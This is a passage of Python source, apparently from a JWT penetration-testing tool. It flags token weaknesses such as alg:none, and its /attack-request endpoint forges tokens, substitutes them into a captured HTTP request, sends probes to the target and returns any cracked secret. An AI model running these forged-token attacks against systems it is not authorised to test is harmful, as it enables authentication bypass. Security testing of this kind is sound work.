                "payload": payload,
                "is_expired": payload.get("exp", 0) < time.time() if "exp" in payload else None,
                "issues": [],
            }
            if header.get("alg", "").upper() in ("NONE", ""):
                info["decoded"]["issues"].append({"level": "critical", "msg": "alg:none"})
            if payload.get("exp") and payload["exp"] < time.time():
                info["decoded"]["issues"].append({"level": "medium", "msg": "Expired"})
            if "kid" in header:
                info["decoded"]["issues"].append({"level": "high", "msg": f"kid: {header['kid']}"})
            info["applicable_attacks"] = _get_applicable_attacks(header, payload)
        except Exception:
            info["decoded"] = None
            info["applicable_attacks"] = []
        result.append(info)
    return {"found": result, "count": len(result)}


@router.post("/attack-request")
async def attack_request(req: RequestScanRequest):
    """
    Run JWT attacks against a full HTTP request.
    Detects JWT location automatically, forges tokens, replaces in request, sends.
    """
    found = _find_jwt_in_request(req.headers, req.body, req.url)
    if not found:
        return {"error": "No JWT found in request"}

    jwt_info = found[0]  # Attack the first JWT found
    token = jwt_info["token"]

    try:
        header, payload, parts = _decode_parts(token)
    except Exception as e:
        return {"error": str(e)}

    original_sig = parts[2]
    attack_ids = [req.attack_id] if req.attack_id else _get_applicable_attacks(header, payload)

    results = []

    for attack_id in attack_ids:
        # Reuse single-attack logic to get forged tokens
        single_req = SingleAttackRequest(
            token=token,
            attack_id=attack_id,
            target_url=req.url,
            header_name="",  # we handle injection ourselves
            wordlist=req.wordlist,
            public_key=req.public_key,
        )
        attack_result = await single_attack(single_req)

        if attack_result.get("manual") or attack_result.get("error"):
            results.append({
                "attack_id": attack_id,
                "manual": attack_result.get("manual", False),
                "error": attack_result.get("error"),
                "instructions": attack_result.get("instructions"),
                "probes": [],
            })
            continue

        probes = []
        tokens_to_test = attack_result.get("probes") or []

        for t_info in tokens_to_test[:5]:  # cap at 5 per attack
            tok = t_info.get("token")
            if not tok:
                continue
            new_headers, new_body, new_url = _replace_token_in_request(
                req.headers, req.body, req.url, jwt_info, tok
            )
            probe = await _send_request(req.method, new_url, new_headers, new_body, req.use_https)
            probes.append({
                "label": t_info.get("label", attack_id),
                "token": tok,
                "probe": probe,
            })

        # Weak secret special case
        if attack_id == "weak_secret" and attack_result.get("cracked"):
            results.append({
                "attack_id": attack_id,
                "cracked": True,
                "secret": attack_result.get("secret"),
                "probes": probes,
            })
        else:
            results.append({
                "attack_id": attack_id,
                "probes": probes,
            })

    return {
        "jwt_location": jwt_info["location"],
        "jwt_header": jwt_info.get("header_name") or jwt_info.get("cookie_name") or jwt_info.get("param_name"),
        "original_token": token,
        "results": results,
    }
